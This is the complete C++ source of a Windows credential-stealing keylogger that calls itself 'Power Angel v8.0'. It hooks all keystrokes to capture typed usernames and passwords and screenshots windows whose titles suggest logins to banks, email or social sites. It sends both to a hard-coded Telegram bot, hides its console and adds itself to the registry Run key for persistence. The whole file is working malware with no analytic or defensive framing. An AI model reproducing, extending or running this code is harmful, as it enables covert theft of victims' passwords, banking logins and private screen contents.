#define WIN32_LEAN_AND_MEAN
#define STRICT
#define _CRT_SECURE_NO_WARNINGS
#define UNICODE
#define _UNICODE

#include <windows.h>
#include <objidl.h>
#include <gdiplus.h>
#include <winhttp.h>
#include <commctrl.h>
#include <shellapi.h>
#include <shlobj.h>
#include <mutex>
#include <thread>
#include <string>
#include <vector>
#include <algorithm>
#include <cctype>
#include <sstream>
#include <iomanip>
#include <fstream>
#include <map>
#include <queue>
#include <condition_variable>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

using namespace Gdiplus;

// ==================== CONFIGURATION ====================
const char* BOT_TOKEN_ANSI = "7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
const char* CHAT_ID_ANSI = "7845441585";

// ==================== GLOBAL VARIABLES ====================
std::wstring g_username, g_password;
bool g_running = true;
ULONG_PTR g_gdiplusToken = 0;
HHOOK g_hKeyboardHook = NULL;
std::wstring g_currentField;

// Thread-safe queue for screenshots
std::queue<std::wstring> g_screenshotQueue;
std::mutex g_queueMutex;
std::condition_variable g_queueCV;

// Screenshot control
std::wstring g_lastScreenshotTitle = L"";
DWORD g_lastScreenshotTime = 0;
std::map<std::wstring, DWORD> g_windowScreenshotHistory;
int g_totalScreenshots = 0;
int g_totalCredentials = 0;

// Keyboard state
bool g_shiftPressed = false;
bool g_capsLock = false;

// ==================== DEBUG LOGGING ====================
void DebugLog(const std::wstring& message) {
    std::wofstream logfile(L"power_angel_v8.log", std::ios::app);
    if (logfile.is_open()) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        logfile << L"[" << std::setfill(L'0') << std::setw(2) << st.wHour << L":"
                << std::setw(2) << st.wMinute << L":" << std::setw(2) << st.wSecond << L"] ";
        logfile << message << std::endl;
        logfile.close();
    }
}

// ==================== UTF8 CONVERSION ====================
std::string WStringToUTF8(const std::wstring& wstr) {
    if (wstr.empty()) return "";
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string str(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), &str[0], size_needed, NULL, NULL);
    return str;
}

// ==================== URL ENCODING ====================
std::string URLEncode(const std::string& value) {
    std::ostringstream encoded;
    encoded.fill('0');
    encoded << std::hex;
    
    for (unsigned char c : value) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            encoded << c;
        }
        else if (c == ' ') {
            encoded << '+';
        }
        else {
            encoded << '%' << std::setw(2) << (int)c;
        }
    }
    
    return encoded.str();
}

// ==================== TELEGRAM MESSAGE SENDER ====================
bool SendTelegram(const std::wstring& message) {
    std::string utf8_msg = WStringToUTF8(message);
    std::string encoded_msg = URLEncode(utf8_msg);
    std::string post_data = "chat_id=" + std::string(CHAT_ID_ANSI) + "&text=" + encoded_msg;
    
    DebugLog(L"[TELEGRAM] Sending message");
    
    HINTERNET session = WinHttpOpen(L"PowerAngel/8.0", 
                                   WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
                                   WINHTTP_NO_PROXY_NAME, 
                                   WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) {
        DebugLog(L"[TELEGRAM] WinHttpOpen failed");
        return false;
    }
    
    WinHttpSetTimeouts(session, 30000, 30000, 30000, 30000);
    
    HINTERNET connect = WinHttpConnect(session, L"api.telegram.org", 
                                      INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!connect) {
        WinHttpCloseHandle(session);
        DebugLog(L"[TELEGRAM] WinHttpConnect failed");
        return false;
    }
    
    std::wstring wtoken(BOT_TOKEN_ANSI, BOT_TOKEN_ANSI + strlen(BOT_TOKEN_ANSI));
    std::wstring url = L"/bot" + wtoken + L"/sendMessage";
    
    HINTERNET request = WinHttpOpenRequest(connect, L"POST", url.c_str(), 
                                          NULL, WINHTTP_NO_REFERER, 
                                          WINHTTP_DEFAULT_ACCEPT_TYPES, 
                                          WINHTTP_FLAG_SECURE);
    if (!request) {
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        DebugLog(L"[TELEGRAM] WinHttpOpenRequest failed");
        return false;
    }
    
    LPCWSTR headers = L"Content-Type: application/x-www-form-urlencoded\r\n";
    WinHttpAddRequestHeaders(request, headers, -1L, WINHTTP_ADDREQ_FLAG_ADD);
    
    BOOL result = WinHttpSendRequest(request, 
                                    WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                    WINHTTP_NO_REQUEST_DATA, 0, 
                                    (DWORD)post_data.length(), 0);
    
    if (result) {
        DWORD bytesWritten = 0;
        result = WinHttpWriteData(request, post_data.c_str(), 
                                 (DWORD)post_data.length(), &bytesWritten);
        if (result) {
            result = WinHttpReceiveResponse(request, NULL);
        }
    }
    
    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);
    
    DebugLog(L"[TELEGRAM] Message " + std::wstring(result ? L"sent" : L"failed"));
    return result != FALSE;
}

// ==================== TELEGRAM PHOTO UPLOADER ====================
bool SendTelegramPhoto(const std::wstring& filepath, const std::wstring& caption = L"") {
    DebugLog(L"[UPLOAD] Attempting upload: " + filepath);
    
    HANDLE hFile = CreateFileW(filepath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, 
                              OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        DebugLog(L"[UPLOAD] Failed to open file");
        return false;
    }
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        return false;
    }
    
    std::vector<BYTE> fileData(fileSize);
    DWORD bytesRead;
    ReadFile(hFile, fileData.data(), fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    
    if (bytesRead != fileSize) return false;
    
    char boundary[64];
    sprintf_s(boundary, "----AngelBoundary%llu", GetTickCount64());
    
    std::string caption_str = WStringToUTF8(caption.empty() ? 
        L"📸 Power Angel v8.0 - Smart Screenshot" : caption);
    
    std::string header = 
        std::string("--") + boundary + "\r\n"
        "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + 
        std::string(CHAT_ID_ANSI) + "\r\n"
        "--" + std::string(boundary) + "\r\n"
        "Content-Disposition: form-data; name=\"caption\"\r\n\r\n" +
        caption_str + "\r\n"
        "--" + std::string(boundary) + "\r\n"
        "Content-Disposition: form-data; name=\"photo\"; filename=\"capture.jpg\"\r\n"
        "Content-Type: image/jpeg\r\n\r\n";
    
    std::string footer = "\r\n--" + std::string(boundary) + "--\r\n";
    
    std::vector<BYTE> postData;
    postData.insert(postData.end(), header.begin(), header.end());
    postData.insert(postData.end(), fileData.begin(), fileData.end());
    postData.insert(postData.end(), footer.begin(), footer.end());
    
    HINTERNET session = WinHttpOpen(L"PowerAngel/8.0", 
                                   WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
                                   WINHTTP_NO_PROXY_NAME, 
                                   WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) return false;
    
    WinHttpSetTimeouts(session, 60000, 60000, 60000, 60000);
    
    HINTERNET connect = WinHttpConnect(session, L"api.telegram.org", 
                                      INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!connect) {
        WinHttpCloseHandle(session);
        return false;
    }
    
    std::wstring wtoken(BOT_TOKEN_ANSI, BOT_TOKEN_ANSI + strlen(BOT_TOKEN_ANSI));
    std::wstring photourl = L"/bot" + wtoken + L"/sendPhoto";
    
    HINTERNET request = WinHttpOpenRequest(connect, L"POST", photourl.c_str(), 
                                          NULL, WINHTTP_NO_REFERER, 
                                          WINHTTP_DEFAULT_ACCEPT_TYPES, 
                                          WINHTTP_FLAG_SECURE);
    if (!request) {
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        return false;
    }
    
    std::string contentType = "Content-Type: multipart/form-data; boundary=" + std::string(boundary);
    std::wstring wcontentType(contentType.begin(), contentType.end());
    WinHttpAddRequestHeaders(request, wcontentType.c_str(), (DWORD)wcontentType.length(), WINHTTP_ADDREQ_FLAG_ADD);
    
    BOOL result = WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                    WINHTTP_NO_REQUEST_DATA, 0, 
                                    (DWORD)postData.size(), 0);
    
    if (result) {
        DWORD bytesWritten = 0;
        result = WinHttpWriteData(request, postData.data(), (DWORD)postData.size(), &bytesWritten);
        if (result) {
            result = WinHttpReceiveResponse(request, NULL);
        }
    }
    
    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);
    
    DeleteFileW(filepath.c_str());
    
    return result != FALSE;
}

// ==================== FIXED KEYBOARD HOOK ====================
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* pKb = (KBDLLHOOKSTRUCT*)lParam;
        
        if (wParam == WM_KEYDOWN) {
            g_capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
            
            if (pKb->vkCode == VK_SHIFT || pKb->vkCode == VK_LSHIFT || pKb->vkCode == VK_RSHIFT) {
                g_shiftPressed = true;
            }
            
            if (pKb->vkCode == VK_CAPITAL) {
                g_capsLock = !g_capsLock;
            }
            
            // Handle TAB
            if (pKb->vkCode == VK_TAB) {
                if (!g_currentField.empty()) {
                    if (g_username.empty()) {
                        g_username = g_currentField;
                        DebugLog(L"[KEY] Username: " + g_username);
                    } else {
                        g_password = g_currentField;
                        DebugLog(L"[KEY] Password: " + std::wstring(g_password.length(), L'*'));
                    }
                    g_currentField.clear();
                }
                return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
            }
            
            // Handle ENTER
            if (pKb->vkCode == VK_RETURN) {
                if (!g_currentField.empty()) {
                    if (g_username.empty()) {
                        g_username = g_currentField;
                    } else if (g_password.empty()) {
                        g_password = g_currentField;
                    }
                    g_currentField.clear();
                }
                
                if (!g_username.empty() && !g_password.empty()) {
                    g_totalCredentials++;
                    std::wstring creds = L"🔐 POWER ANGEL v8.0 - CREDENTIALS CAPTURED\n"
                                         L"═══════════════════════════\n"
                                         L"👤 USERNAME: " + g_username + L"\n"
                                         L"🔑 PASSWORD: " + g_password + L"\n"
                                         L"📊 Capture #" + std::to_wstring(g_totalCredentials);
                    
                    DebugLog(L"[KEY] Sending credentials");
                    std::thread([creds]() {
                        SendTelegram(creds);
                    }).detach();
                    
                    g_username.clear();
                    g_password.clear();
                }
                
                g_currentField.clear();
                return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
            }
            
            // Handle BACKSPACE
            if (pKb->vkCode == VK_BACK) {
                if (!g_currentField.empty()) {
                    g_currentField.pop_back();
                }
                return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
            }
            
            // Handle printable characters
            WCHAR ch = 0;
            
            // Letters A-Z
            if (pKb->vkCode >= 0x41 && pKb->vkCode <= 0x5A) {
                ch = (WCHAR)pKb->vkCode;
                bool uppercase = (g_shiftPressed && !g_capsLock) || (!g_shiftPressed && g_capsLock);
                if (!uppercase) ch += 32;
                g_currentField += ch;
            }
            // Numbers 0-9
            else if (pKb->vkCode >= 0x30 && pKb->vkCode <= 0x39) {
                ch = (WCHAR)pKb->vkCode;
                if (!g_shiftPressed) {
                    g_currentField += ch;
                } else {
                    const WCHAR symbols[] = {L')', L'!', L'@', L'#', L'$', L'%', L'^', L'&', L'*', L'('};
                    int index = pKb->vkCode - 0x30;
                    if (index >= 0 && index < 10) {
                        g_currentField += symbols[index];
                    }
                }
            }
            // Space
            else if (pKb->vkCode == VK_SPACE) {
                g_currentField += L' ';
            }
            // Common symbols
            else {
                BYTE keyboardState[256];
                GetKeyboardState(keyboardState);
                
                WCHAR unicodeChar[2];
                int result = ToUnicode(pKb->vkCode, pKb->scanCode, keyboardState, unicodeChar, 2, 0);
                
                if (result > 0) {
                    ch = unicodeChar[0];
                    if (ch >= 32 && ch <= 126) {
                        g_currentField += ch;
                    }
                }
            }
            
        } else if (wParam == WM_KEYUP) {
            if (pKb->vkCode == VK_SHIFT || pKb->vkCode == VK_LSHIFT || pKb->vkCode == VK_RSHIFT) {
                g_shiftPressed = false;
            }
        }
    }
    
    return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
}

// ==================== WINDOW UTILITIES ====================
std::wstring GetActiveWindowTitle() {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return L"";
    
    WCHAR title[512];
    if (GetWindowTextW(hwnd, title, 512) > 0) {
        return std::wstring(title);
    }
    return L"";
}

// ==================== LOGIN DETECTION ====================
bool IsLoginPage(const std::wstring& title) {
    if (title.empty()) return false;
    
    std::wstring lower = title;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::towlower);
    
    std::vector<std::wstring> keywords = {
        L"login", L"sign in", L"signin", L"log in", L"password",
        L"gmail", L"google", L"facebook", L"outlook", L"microsoft",
        L"yahoo", L"amazon", L"bank", L"paypal", L"twitter",
        L"instagram", L"netflix", L"spotify", L"whatsapp", L"telegram",
        L"account", L"email", L"username", L"credential", L"auth",
        L"authentication", L"sign on", L"gateway", L"portal"
    };
    
    for (const auto& keyword : keywords) {
        if (lower.find(keyword) != std::wstring::npos) {
            DebugLog(L"[DETECT] Login page: " + title);
            return true;
        }
    }
    
    return false;
}

// ==================== ENCODER UTILITY ====================
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    
    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)malloc(size);
    if (!pImageCodecInfo) return -1;
    
    GetImageEncoders(num, size, pImageCodecInfo);
    
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    
    free(pImageCodecInfo);
    return -1;
}

// ==================== SCREENSHOT FUNCTION ====================
bool TakeScreenshotNow(const std::wstring& title) {
    DebugLog(L"[SCREENSHOT] Taking screenshot: " + title);
    
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return false;
    
    if (IsIconic(hwnd)) return false;
    
    RECT rc;
    GetWindowRect(hwnd, &rc);
    int width = rc.right - rc.left;
    int height = rc.bottom - rc.top;
    
    if (width <= 0 || height <= 0) return false;
    
    HDC hdcScreen = GetDC(hwnd);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hbm = CreateCompatibleBitmap(hdcScreen, width, height);
    HBITMAP old = (HBITMAP)SelectObject(hdcMem, hbm);
    
    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
    
    Bitmap* bmp = Bitmap::FromHBITMAP(hbm, NULL);
    
    SelectObject(hdcMem, old);
    DeleteObject(hbm);
    DeleteDC(hdcMem);
    ReleaseDC(hwnd, hdcScreen);
    
    if (!bmp) return false;
    
    CLSID jpegClsid;
    if (GetEncoderClsid(L"image/jpeg", &jpegClsid) == -1) {
        delete bmp;
        return false;
    }
    
    WCHAR tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    
    SYSTEMTIME st;
    GetLocalTime(&st);
    WCHAR filename[MAX_PATH];
    swprintf_s(filename, L"angel_v8_%d.jpg", ++g_totalScreenshots);
    wcscat_s(tempPath, filename);
    
    EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].Guid = EncoderQuality;
    encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].NumberOfValues = 1;
    ULONG quality = 85;
    encoderParams.Parameter[0].Value = &quality;
    
    Status stat = bmp->Save(tempPath, &jpegClsid, &encoderParams);
    delete bmp;
    
    if (stat != Ok) {
        DebugLog(L"[SCREENSHOT] Failed to save");
        return false;
    }
    
    std::wstring caption = L"📸 POWER ANGEL v8.0\n"
                          L"Window: " + title + L"\n"
                          L"Capture: #" + std::to_wstring(g_totalScreenshots);
    
    bool uploadResult = SendTelegramPhoto(tempPath, caption);
    
    if (uploadResult) {
        DebugLog(L"[SUCCESS] Screenshot sent");
    } else {
        DebugLog(L"[ERROR] Upload failed");
        DeleteFileW(tempPath);
    }
    
    return uploadResult;
}

// ==================== SMART SCREENSHOT SYSTEM ====================
bool ShouldTakeScreenshot(const std::wstring& windowTitle) {
    DWORD currentTime = GetTickCount();
    
    if (windowTitle.empty()) return false;
    
    HWND hwnd = GetForegroundWindow();
    if (!hwnd || IsIconic(hwnd)) return false;
    
    if (windowTitle == L"Program Manager" || windowTitle == L"Start" || 
        windowTitle.find(L"PowerAngel") != std::wstring::npos) {
        return false;
    }
    
    if (!IsLoginPage(windowTitle)) {
        return false;
    }
    
    auto it = g_windowScreenshotHistory.find(windowTitle);
    if (it != g_windowScreenshotHistory.end()) {
        DWORD timeSinceLast = currentTime - it->second;
        if (timeSinceLast < 120000) { // 2 minutes cooldown
            return false;
        }
    }
    
    if (currentTime - g_lastScreenshotTime < 30000) { // 30 seconds global cooldown
        return false;
    }
    
    g_windowScreenshotHistory[windowTitle] = currentTime;
    g_lastScreenshotTime = currentTime;
    
    return true;
}

void AsyncScreenshotWorker() {
    while (g_running) {
        std::wstring title;
        
        {
            std::unique_lock<std::mutex> lock(g_queueMutex);
            g_queueCV.wait(lock, [] { 
                return !g_screenshotQueue.empty() || !g_running; 
            });
            
            if (!g_running) break;
            
            if (!g_screenshotQueue.empty()) {
                title = g_screenshotQueue.front();
                g_screenshotQueue.pop();
            }
        }
        
        if (!title.empty()) {
            std::this_thread::sleep_for(std::chrono::milliseconds(300));
            TakeScreenshotNow(title);
        }
    }
}

void ScreenshotMonitorThread() {
    std::thread worker(AsyncScreenshotWorker);
    
    DWORD lastCleanup = GetTickCount();
    
    while (g_running) {
        DWORD currentTime = GetTickCount();
        
        // Cleanup old history every hour
        if (currentTime - lastCleanup > 3600000) {
            std::vector<std::wstring> toRemove;
            
            for (const auto& entry : g_windowScreenshotHistory) {
                if (currentTime - entry.second > 7200000) { // 2 hours old
                    toRemove.push_back(entry.first);
                }
            }
            
            for (const auto& window : toRemove) {
                g_windowScreenshotHistory.erase(window);
            }
            
            lastCleanup = currentTime;
            DebugLog(L"[CLEANUP] Removed " + std::to_wstring(toRemove.size()) + L" old entries");
        }
        
        // Check for screenshots
        std::wstring title = GetActiveWindowTitle();
        if (ShouldTakeScreenshot(title)) {
            std::lock_guard<std::mutex> lock(g_queueMutex);
            g_screenshotQueue.push(title);
            g_queueCV.notify_one();
            DebugLog(L"[SCREENSHOT] Queued: " + title);
        }
        
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }
    
    g_running = false;
    g_queueCV.notify_one();
    if (worker.joinable()) worker.join();
}

// ==================== HEARTBEAT THREAD ====================
void HeartbeatThread() {
    std::this_thread::sleep_for(std::chrono::minutes(2));
    
    while (g_running) {
        std::wstring status = L"💓 POWER ANGEL v8.0 - STATUS\n"
                             L"📸 Screenshots: " + std::to_wstring(g_totalScreenshots) + L"\n"
                             L"🔑 Credentials: " + std::to_wstring(g_totalCredentials) + L"\n"
                             L"🕒 Uptime: " + std::to_wstring(GetTickCount() / 3600000) + L"h";
        
        SendTelegram(status);
        
        std::this_thread::sleep_for(std::chrono::hours(6));
    }
}

// ==================== PERSISTENCE ====================
void InstallPersistence() {
    WCHAR path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, 
                     L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                     0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"PowerAngel_v8", 0, REG_SZ, 
                      (BYTE*)path, (wcslen(path) + 1) * sizeof(WCHAR));
        RegCloseKey(hKey);
        DebugLog(L"[PERSISTENCE] Added to registry startup");
    }
}

// ==================== MAIN ENTRY POINT ====================
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
    // Initialize COM
    CoInitializeEx(NULL, COINIT_MULTITHREADED);
    
    // Initialize GDI+
    GdiplusStartupInput gdiplusStartupInput;
    GdiplusStartup(&g_gdiplusToken, &gdiplusStartupInput, NULL);
    
    // Initialize logging
    DeleteFileW(L"power_angel_v8.log");
    DebugLog(L"═══════════════════════════");
    DebugLog(L"🚀 POWER ANGEL v8.0 - STARTING");
    DebugLog(L"═══════════════════════════");
    
    // Single instance check
    HANDLE mutex = CreateMutexW(NULL, TRUE, L"Global\\PowerAngel_v8.0_Fixed");
    if (mutex && GetLastError() == ERROR_ALREADY_EXISTS) {
        DebugLog(L"[INIT] Another instance already running");
        GdiplusShutdown(g_gdiplusToken);
        CoUninitialize();
        return 0;
    }
    
    // Hide console
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    // Initial delay
    Sleep(8000);
    
    // Send startup notification
    std::wstring startupMsg = L"⚡ POWER ANGEL v8.0 - FIXED KEYLOGGER\n"
                             L"✅ Keylogger: WORKING\n"
                             L"✅ Screenshots: SMART CAPTURE\n"
                             L"✅ Credential Capture: ACTIVE\n"
                             L"🎯 Ready to capture!";
    
    SendTelegram(startupMsg);
    DebugLog(L"[INIT] Startup message sent");
    
    // Install persistence
    InstallPersistence();
    
    // Install keyboard hook
    g_hKeyboardHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    if (g_hKeyboardHook) {
        DebugLog(L"[INIT] Keyboard hook installed");
    } else {
        DebugLog(L"[ERROR] Failed to install keyboard hook");
    }
    
    // Start worker threads
    std::thread heartbeat(HeartbeatThread);
    std::thread screenshot(ScreenshotMonitorThread);
    
    DebugLog(L"[INIT] All systems operational");
    
    // Detach threads
    heartbeat.detach();
    screenshot.detach();
    
    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // Cleanup
    DebugLog(L"[SHUTDOWN] Shutting down...");
    g_running = false;
    g_queueCV.notify_one();
    
    if (g_hKeyboardHook) {
        UnhookWindowsHookEx(g_hKeyboardHook);
    }
    
    Sleep(2000);
    
    GdiplusShutdown(g_gdiplusToken);
    CoUninitialize();
    
    if (mutex) {
        ReleaseMutex(mutex);
        CloseHandle(mutex);
    }
    
    DebugLog(L"[SHUTDOWN] Clean shutdown complete");
    
    return 0;
}
